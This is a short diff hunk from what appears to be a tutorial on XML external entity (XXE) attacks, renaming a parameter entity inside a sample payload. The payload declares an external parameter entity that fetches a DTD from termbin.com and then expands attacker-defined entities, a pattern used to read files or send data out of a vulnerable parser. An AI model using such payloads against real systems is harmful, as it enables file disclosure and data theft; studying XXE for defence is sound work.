@@ -170,7 +170,7 @@ Entities operate like variables within the XML document where, once defined, the
     <!ELEMENT xxe ANY>
     <!ENTITY % a SYSTEM "http://termbin.com/mo28">
     %a;
-    %all;
+    %combined;
 ]>
 <return>&pwnFunc;</return>
 ```
